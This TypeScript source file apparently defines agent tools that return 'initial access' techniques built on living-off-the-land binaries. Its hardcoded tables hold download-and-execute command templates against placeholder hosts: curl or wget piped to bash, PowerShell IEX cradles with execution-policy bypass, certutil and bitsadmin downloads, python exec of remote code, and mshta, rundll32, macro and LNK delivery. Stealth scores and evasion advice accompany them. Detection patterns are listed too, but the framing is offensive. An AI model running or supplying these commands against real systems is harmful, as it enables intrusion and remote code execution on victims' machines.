import { z } from "zod";
import type { ToolDef, ToolContext, ToolResult } from "../types/index.js";
import { json, text } from "../types/index.js";
import type { Platform, UnifiedLOLEntry } from "../schema/unified-entry.js";

// ━━━ Hardcoded Initial Access Technique Data ━━━

interface InitialAccessTechnique {
  name: string;
  description: string;
  binary: string;
  commandTemplate: string;
  detectionPatterns: string[];
  stealthScore: number;
  platforms: Platform[];
  attck: string[];
  notes: string;
}

const DOWNLOAD_EXEC_TECHNIQUES: InitialAccessTechnique[] = [
  {
    name: "certutil Download",
    description: "Use certutil.exe to download a remote payload via URL and decode from base64",
    binary: "certutil.exe",
    commandTemplate: "certutil.exe -urlcache -split -f http://<HOST>/<PAYLOAD> C:\\Windows\\Temp\\<PAYLOAD>",
    detectionPatterns: ["certutil.exe -urlcache", "certutil.exe network connection", "Sysmon Event 1 certutil", "File creation in Temp directory"],
    stealthScore: 4,
    platforms: ["windows"],
    attck: ["T1105", "T1140"],
    notes: "Well-known LOL technique; heavily monitored by EDR. Consider combining with rename.",
  },
  {
    name: "bitsadmin Download",
    description: "Use bitsadmin to create a BITS job that downloads a remote file",
    binary: "bitsadmin.exe",
    commandTemplate: "bitsadmin /transfer job /download /priority high http://<HOST>/<PAYLOAD> C:\\Windows\\Temp\\<PAYLOAD>",
    detectionPatterns: ["bitsadmin /transfer", "BITS job creation", "Sysmon Event 1 bitsadmin", "Event ID 60 BITS client"],
    stealthScore: 3,
    platforms: ["windows"],
    attck: ["T1105", "T1197"],
    notes: "BITS transfers persist across reboots and can be scheduled.",
  },
  {
    name: "curl Download and Execute",
    description: "Use curl to download and pipe directly to a shell interpreter",
    binary: "curl",
    commandTemplate: "curl -sL http://<HOST>/<PAYLOAD> | bash",
    detectionPatterns: ["curl piped to bash/sh", "curl outbound HTTP", "Process chain: curl -> bash"],
    stealthScore: 3,
    platforms: ["linux", "macos"],
    attck: ["T1105", "T1059.004"],
    notes: "Extremely common for Linux/macOS. The pipe-to-shell pattern is well-known.",
  },
  {
    name: "wget Download and Execute",
    description: "Use wget to download payload and execute via shell",
    binary: "wget",
    commandTemplate: "wget -qO- http://<HOST>/<PAYLOAD> | bash",
    detectionPatterns: ["wget piped to bash/sh", "wget outbound HTTP", "Process chain: wget -> bash"],
    stealthScore: 3,
    platforms: ["linux"],
    attck: ["T1105", "T1059.004"],
    notes: "Alternative to curl; wget is often available on minimal Linux installs.",
  },
  {
    name: "PowerShell Download Cradle",
    description: "Use PowerShell to download and invoke a remote script in memory",
    binary: "powershell.exe",
    commandTemplate: "powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://<HOST>/<PAYLOAD>')\"",
    detectionPatterns: ["powershell IEX", "DownloadString", "Net.WebClient", "Script block logging Event 4104", "AMSI detection"],
    stealthScore: 4,
    platforms: ["windows"],
    attck: ["T1105", "T1059.001"],
    notes: "Heavily monitored. Use obfuscation or alternative cradle syntax.",
  },
  {
    name: "PowerShell Invoke-WebRequest",
    description: "Use PowerShell Invoke-WebRequest cmdlet for file download",
    binary: "powershell.exe",
    commandTemplate: "powershell -ep bypass -c \"Invoke-WebRequest -Uri 'http://<HOST>/<PAYLOAD>' -OutFile 'C:\\Temp\\<PAYLOAD>'\"",
    detectionPatterns: ["Invoke-WebRequest", "powershell network connection", "Script block logging"],
    stealthScore: 4,
    platforms: ["windows"],
    attck: ["T1105", "T1059.001"],
    notes: "Modern alternative to Net.WebClient. Still heavily logged.",
  },
  {
    name: "Python HTTP Download",
    description: "Use Python urllib or requests to download and execute payload",
    binary: "python3",
    commandTemplate: "python3 -c \"import urllib.request; exec(urllib.request.urlopen('http://<HOST>/<PAYLOAD>').read())\"",
    detectionPatterns: ["python3 -c", "urllib.request", "Outbound HTTP from python"],
    stealthScore: 3,
    platforms: ["linux", "macos"],
    attck: ["T1105", "T1059.006"],
    notes: "Python is commonly installed; may blend in with legitimate usage.",
  },
];

const COMPILE_EXEC_TECHNIQUES: InitialAccessTechnique[] = [
  {
    name: "C# Compilation via csc.exe",
    description: "Compile and execute C# code on target using the .NET C# compiler",
    binary: "csc.exe",
    commandTemplate: "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:C:\\Temp\\payload.exe C:\\Temp\\payload.cs",
    detectionPatterns: ["csc.exe execution", "Compiler output in Temp", "Sysmon Event 1 csc.exe", ".NET compilation events"],
    stealthScore: 3,
    platforms: ["windows"],
    attck: ["T1027.004", "T1059"],
    notes: "Compiles C# source to executable on disk. The .NET compiler is present on all modern Windows.",
  },
  {
    name: "VB.NET Compilation via vbc.exe",
    description: "Compile VB.NET code on target using the Visual Basic compiler",
    binary: "vbc.exe",
    commandTemplate: "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\vbc.exe /out:C:\\Temp\\payload.exe C:\\Temp\\payload.vb",
    detectionPatterns: ["vbc.exe execution", "Compiler output in Temp", ".NET compilation"],
    stealthScore: 3,
    platforms: ["windows"],
    attck: ["T1027.004", "T1059"],
    notes: "Less monitored than csc.exe. VB.NET compiler ships with .NET Framework.",
  },
  {
    name: "GCC Compilation",
    description: "Compile C/C++ source code on target using GCC",
    binary: "gcc",
    commandTemplate: "gcc -o /tmp/payload /tmp/payload.c && chmod +x /tmp/payload && /tmp/payload",
    detectionPatterns: ["gcc execution", "Compilation in /tmp", "New executable in /tmp", "Process chain: gcc -> payload"],
    stealthScore: 3,
    platforms: ["linux"],
    attck: ["T1027.004", "T1059"],
    notes: "GCC may not be installed on production servers. Check with `which gcc`.",
  },
  {
    name: "Go Build",
    description: "Compile Go source code on target to produce a static binary",
    binary: "go",
    commandTemplate: "cd /tmp && go build -o payload payload.go && ./payload",
    detectionPatterns: ["go build execution", "Go compiler activity", "Static binary creation"],
    stealthScore: 3,
    platforms: ["linux", "macos"],
    attck: ["T1027.004", "T1059"],
    notes: "Go produces static binaries with no dependencies. Large binary size may be notable.",
  },
  {
    name: "MSBuild Inline Task",
    description: "Use MSBuild to compile and execute inline C# task from a .csproj or .xml file",
    binary: "msbuild.exe",
    commandTemplate: "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe C:\\Temp\\payload.csproj",
    detectionPatterns: ["msbuild.exe execution", "MSBuild with unusual project file", "Inline task compilation", "Sysmon Event 1 MSBuild"],
    stealthScore: 3,
    platforms: ["windows"],
    attck: ["T1127.001", "T1027.004"],
    notes: "MSBuild is a trusted Microsoft binary that can compile and execute C# inline tasks.",
  },
];

const SCRIPT_HOST_TECHNIQUES: InitialAccessTechnique[] = [
  {
    name: "mshta HTA Execution",
    description: "Use mshta.exe to execute HTML Application (HTA) files with embedded scripts",
    binary: "mshta.exe",
    commandTemplate: "mshta http://<HOST>/payload.hta",
    detectionPatterns: ["mshta.exe execution", "mshta outbound connection", "Sysmon Event 1 mshta", "HTA file download"],
    stealthScore: 4,
    platforms: ["windows"],
    attck: ["T1218.005", "T1059.005"],
    notes: "mshta can fetch and execute HTA from URL. Heavily monitored by modern EDR.",
  },
  {
    name: "cscript/wscript VBS Execution",
    description: "Execute VBScript or JScript files using Windows Script Host",
    binary: "cscript.exe",
    commandTemplate: "cscript.exe //nologo C:\\Temp\\payload.vbs",
    detectionPatterns: ["cscript.exe execution", "wscript.exe execution", "Script host spawning child process", "Event 4688 script host"],
    stealthScore: 3,
    platforms: ["windows"],
    attck: ["T1059.005", "T1059.007"],
    notes: "Windows Script Host is a signed Microsoft binary. Can run VBS and JS files.",
  },
  {
    name: "wscript VBS Execution",
    description: "Execute VBScript files using wscript.exe (GUI-based Windows Script Host)",
    binary: "wscript.exe",
    commandTemplate: "wscript.exe C:\\Temp\\payload.vbs",
    detectionPatterns: ["wscript.exe execution", "Script host spawning child process", "VBS file execution"],
    stealthScore: 3,
    platforms: ["windows"],
    attck: ["T1059.005"],
    notes: "wscript runs scripts without a console window, unlike cscript.",
  },
  {
    name: "rundll32 Script Execution",
    description: "Use rundll32.exe to execute JavaScript via mshtml",
    binary: "rundll32.exe",
    commandTemplate: "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write();h=new%20ActiveXObject(\"WScript.Shell\").Run(\"<CMD>\")",
    detectionPatterns: ["rundll32.exe with javascript:", "rundll32.exe spawning child process", "Sysmon Event 1 rundll32"],
    stealthScore: 4,
    platforms: ["windows"],
    attck: ["T1218.011", "T1059.007"],
    notes: "rundll32 JavaScript execution technique. Well-known and heavily detected.",
  },
];

const MACRO_TECHNIQUES: InitialAccessTechnique[] = [
  {
    name: "Office VBA Macro Execution",
    description: "Execute VBA macro payload via Microsoft Office document (Word, Excel)",
    binary: "winword.exe",
    commandTemplate: "winword.exe /m <MACRO_DOCUMENT.docm>",
    detectionPatterns: ["Office application spawning cmd/powershell", "VBA macro execution", "WINWORD.EXE child process", "Event 4688 Office -> cmd chain"],
    stealthScore: 4,
    platforms: ["windows"],
    attck: ["T1204.002", "T1059.005", "T1566.001"],
    notes: "Requires user interaction to enable macros. Mark of the Web may block execution.",
  },
  {
    name: "Excel 4.0 Macro (XLM)",
    description: "Use legacy Excel 4.0 XLM macros for code execution",
    binary: "excel.exe",
    commandTemplate: "excel.exe <PAYLOAD.xlsm>",
    detectionPatterns: ["Excel 4.0 macro sheet", "EXCEL.EXE spawning child process", "XLM formula evaluation", "AMSI XLM detection"],
    stealthScore: 4,
    platforms: ["windows"],
    attck: ["T1204.002", "T1059"],
    notes: "XLM macros are legacy but still supported. Some EDR/AV have limited XLM visibility.",
  },
  {
    name: "Office Add-in (WLL/XLL)",
    description: "Load malicious Office add-in (WLL for Word, XLL for Excel) for code execution",
    binary: "excel.exe",
    commandTemplate: "Copy XLL to %APPDATA%\\Microsoft\\AddIns\\ then load via Excel",
    detectionPatterns: ["XLL/WLL file creation in AddIns directory", "Office loading unusual DLL", "LoadLibrary from Office process"],
    stealthScore: 3,
    platforms: ["windows"],
    attck: ["T1137.006", "T1204.002"],
    notes: "Office add-ins auto-load from specific directories. XLL are DLLs loaded by Excel.",
  },
];

const HTA_TECHNIQUES: InitialAccessTechnique[] = [
  {
    name: "HTA with VBScript Payload",
    description: "HTML Application with embedded VBScript for command execution",
    binary: "mshta.exe",
    commandTemplate: "mshta http://<HOST>/payload.hta",
    detectionPatterns: ["mshta.exe execution", "HTA download", "VBScript in HTA", "mshta spawning child process"],
    stealthScore: 4,
    platforms: ["windows"],
    attck: ["T1218.005", "T1059.005"],
    notes: "HTA files run with full trust by default. Can embed VBScript or JScript.",
  },
  {
    name: "HTA with JScript Payload",
    description: "HTML Application with embedded JScript for ActiveX object instantiation",
    binary: "mshta.exe",
    commandTemplate: "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"<CMD>\"\", 0:close\")",
    detectionPatterns: ["mshta vbscript:Execute", "ActiveX object creation", "mshta command-line scripting"],
    stealthScore: 4,
    platforms: ["windows"],
    attck: ["T1218.005", "T1059.007"],
    notes: "Inline HTA execution without a file on disk.",
  },
  {
    name: "HTA via Shortcut (LNK)",
    description: "Deliver HTA execution via a crafted LNK shortcut file",
    binary: "mshta.exe",
    commandTemplate: "Create LNK pointing to: mshta.exe http://<HOST>/payload.hta",
    detectionPatterns: ["LNK file launching mshta", "mshta child process from explorer", "Shortcut with mshta target"],
    stealthScore: 4,
    platforms: ["windows"],
    attck: ["T1218.005", "T1204.001", "T1547.009"],
    notes: "Combines LNK social engineering with HTA execution. Double-click delivery.",
  },
  {
    name: "HTA with PowerShell Cradle",
    description: "HTA that launches a PowerShell download cradle for second-stage payload",
    binary: "mshta.exe",
    commandTemplate: "mshta http://<HOST>/cradle.hta (HTA contains: powershell -ep bypass -c IEX(...))",
    detectionPatterns: ["mshta -> powershell process chain", "HTA spawning powershell", "Script block logging", "AMSI detection"],
    stealthScore: 5,
    platforms: ["windows"],
    attck: ["T1218.005", "T1059.001"],
    notes: "Multi-stage: HTA executes PowerShell which downloads and runs final payload.",
  },
];

// ━━━ Helper ━━━

function findKBEntries(
  ctx: ToolContext,
  keywords: string[],
  functions: string[],
  platform?: Platform,
): UnifiedLOLEntry[] {
  const results: UnifiedLOLEntry[] = [];
  const seen = new Set<string>();

  for (const func of functions) {
    const entries = ctx.knowledgeBase.searchByFunction(func as any, platform);
    for (const e of entries) {
      if (!seen.has(e.id)) { seen.add(e.id); results.push(e); }
    }
  }

  for (const kw of keywords) {
    const entries = ctx.knowledgeBase.searchByKeyword(kw, platform);
    for (const e of entries) {
      if (!seen.has(e.id)) { seen.add(e.id); results.push(e); }
    }
  }

  return results;
}

function summarizeEntry(e: UnifiedLOLEntry): Record<string, unknown> {
  return {
    binary: e.binary,
    platform: e.platform,
    catalog: e.catalogSource,
    functions: e.functions,
    stealthScore: e.stealthScore,
    commands: e.executionContexts.slice(0, 3).map(c => ({
      context: c.context,
      command: c.command,
      result: c.result,
    })),
    attck: e.attckTechniques,
  };
}

function formatTechnique(t: InitialAccessTechnique): Record<string, unknown> {
  return {
    name: t.name,
    description: t.description,
    binary: t.binary,
    commandTemplate: t.commandTemplate,
    detectionPatterns: t.detectionPatterns,
    stealthScore: t.stealthScore,
    platforms: t.platforms,
    attck: t.attck,
    notes: t.notes,
  };
}

// ━━━ Tools ━━━

const initial_download_exec: ToolDef = {
  name: "initial_download_exec",
  description: "Download and execute payloads via LOL binaries (certutil, bitsadmin, curl, wget, PowerShell)",
  schema: {
    binary: z.string().optional().describe("Filter by specific binary name (e.g. 'certutil', 'curl', 'wget')"),
    platform: z.string().optional().describe("Filter by target platform (linux, windows, macos)"),
    max_stealth: z.number().min(1).max(5).optional().describe("Maximum stealth score (1=stealthiest, 5=loudest)"),
  },
  async execute(args: { binary?: string; platform?: string; max_stealth?: number }, ctx: ToolContext): Promise<ToolResult> {
    let techniques = [...DOWNLOAD_EXEC_TECHNIQUES];

    if (args.binary) {
      const bin = args.binary.toLowerCase().replace(/\.exe$/i, "");
      techniques = techniques.filter(t =>
        t.binary.toLowerCase().replace(/\.exe$/i, "").includes(bin) ||
        t.name.toLowerCase().includes(bin),
      );
    }

    if (args.platform) {
      techniques = techniques.filter(t => t.platforms.includes(args.platform as Platform));
    }

    if (args.max_stealth !== undefined) {
      techniques = techniques.filter(t => t.stealthScore <= args.max_stealth!);
    }

    // Search KB for download-related entries
    const kbEntries = findKBEntries(
      ctx,
      ["certutil", "bitsadmin", "curl", "wget", "download", "transfer"],
      ["download", "command_execution"],
      args.platform as Platform,
    );

    return json({
      totalTechniques: techniques.length,
      techniques: techniques.map(formatTechnique),
      knowledgeBaseMatches: kbEntries.slice(0, 15).map(summarizeEntry),
      totalKBMatches: kbEntries.length,
    });
  },
};

const initial_compile_exec: ToolDef = {
  name: "initial_compile_exec",
  description: "Compile code on target for initial access (csc.exe, gcc, go build, MSBuild)",
  schema: {
    compiler: z.string().optional().describe("Filter by compiler name (e.g. 'csc', 'gcc', 'go', 'msbuild')"),
    platform: z.string().optional().describe("Filter by target platform"),
  },
  async execute(args: { compiler?: string; platform?: string }, ctx: ToolContext): Promise<ToolResult> {
    let techniques = [...COMPILE_EXEC_TECHNIQUES];

    if (args.compiler) {
      const comp = args.compiler.toLowerCase().replace(/\.exe$/i, "");
      techniques = techniques.filter(t =>
        t.binary.toLowerCase().replace(/\.exe$/i, "").includes(comp) ||
        t.name.toLowerCase().includes(comp),
      );
    }

    if (args.platform) {
      techniques = techniques.filter(t => t.platforms.includes(args.platform as Platform));
    }

    // Search KB for compile-related entries
    const kbEntries = findKBEntries(
      ctx,
      ["csc", "vbc", "gcc", "go", "msbuild", "compile", "build"],
      ["compile", "command_execution", "awl_bypass"],
      args.platform as Platform,
    );

    return json({
      totalTechniques: techniques.length,
      techniques: techniques.map(formatTechnique),
      knowledgeBaseMatches: kbEntries.slice(0, 15).map(summarizeEntry),
      totalKBMatches: kbEntries.length,
    });
  },
};

const initial_script_host: ToolDef = {
  name: "initial_script_host",
  description: "Script host execution for initial access (mshta, cscript, wscript, rundll32)",
  schema: {
    host: z.string().optional().describe("Filter by script host name (e.g. 'mshta', 'cscript', 'wscript', 'rundll32')"),
    platform: z.string().optional().describe("Filter by target platform"),
  },
  async execute(args: { host?: string; platform?: string }, ctx: ToolContext): Promise<ToolResult> {
    let techniques = [...SCRIPT_HOST_TECHNIQUES];

    if (args.host) {
      const h = args.host.toLowerCase().replace(/\.exe$/i, "");
      techniques = techniques.filter(t =>
        t.binary.toLowerCase().replace(/\.exe$/i, "").includes(h) ||
        t.name.toLowerCase().includes(h),
      );
    }

    if (args.platform) {
      techniques = techniques.filter(t => t.platforms.includes(args.platform as Platform));
    }

    // Search KB for script host entries
    const kbEntries = findKBEntries(
      ctx,
      ["mshta", "cscript", "wscript", "rundll32", "script"],
      ["command_execution", "defense_evasion", "awl_bypass"],
      args.platform as Platform,
    );

    return json({
      totalTechniques: techniques.length,
      techniques: techniques.map(formatTechnique),
      knowledgeBaseMatches: kbEntries.slice(0, 15).map(summarizeEntry),
      totalKBMatches: kbEntries.length,
    });
  },
};

const initial_macro: ToolDef = {
  name: "initial_macro",
  description: "Macro-based initial access techniques (VBA, XLM, Office add-ins)",
  schema: {
    macro_type: z.enum(["vba", "xlm", "addin", "all"]).optional().default("all")
      .describe("Macro type to look up, or 'all' for all macro techniques"),
  },
  async execute(args: { macro_type?: string }, ctx: ToolContext): Promise<ToolResult> {
    const macroType = args.macro_type || "all";
    let techniques = [...MACRO_TECHNIQUES];

    if (macroType !== "all") {
      const typeMap: Record<string, string> = {
        vba: "vba",
        xlm: "xlm",
        addin: "add-in",
      };
      const searchTerm = typeMap[macroType] || macroType;
      techniques = techniques.filter(t =>
        t.name.toLowerCase().includes(searchTerm) ||
        t.description.toLowerCase().includes(searchTerm),
      );
    }

    // Search KB for macro-related entries
    const kbEntries = findKBEntries(
      ctx,
      ["macro", "vba", "office", "winword", "excel", "xlm"],
      ["command_execution", "defense_evasion"],
      "windows",
    );

    return json({
      macroType,
      totalTechniques: techniques.length,
      techniques: techniques.map(formatTechnique),
      knowledgeBaseMatches: kbEntries.slice(0, 10).map(summarizeEntry),
      totalKBMatches: kbEntries.length,
    });
  },
};

const initial_hta: ToolDef = {
  name: "initial_hta",
  description: "HTA-based initial access techniques (VBScript HTA, JScript HTA, LNK+HTA, HTA+PowerShell)",
  schema: {
    variant: z.enum(["vbscript", "jscript", "lnk", "powershell", "all"]).optional().default("all")
      .describe("HTA variant to look up, or 'all' for all HTA techniques"),
  },
  async execute(args: { variant?: string }, ctx: ToolContext): Promise<ToolResult> {
    const variant = args.variant || "all";
    let techniques = [...HTA_TECHNIQUES];

    if (variant !== "all") {
      const variantMap: Record<string, string> = {
        vbscript: "vbscript",
        jscript: "jscript",
        lnk: "lnk",
        powershell: "powershell",
      };
      const searchTerm = variantMap[variant] || variant;
      techniques = techniques.filter(t =>
        t.name.toLowerCase().includes(searchTerm) ||
        t.description.toLowerCase().includes(searchTerm),
      );
    }

    // Search KB for HTA-related entries
    const kbEntries = findKBEntries(
      ctx,
      ["mshta", "hta", "html application"],
      ["command_execution", "defense_evasion", "awl_bypass"],
      "windows",
    );

    return json({
      variant,
      totalTechniques: techniques.length,
      techniques: techniques.map(formatTechnique),
      knowledgeBaseMatches: kbEntries.slice(0, 10).map(summarizeEntry),
      totalKBMatches: kbEntries.length,
    });
  },
};

export const initialAccessTools: ToolDef[] = [
  initial_download_exec,
  initial_compile_exec,
  initial_script_host,
  initial_macro,
  initial_hta,
];
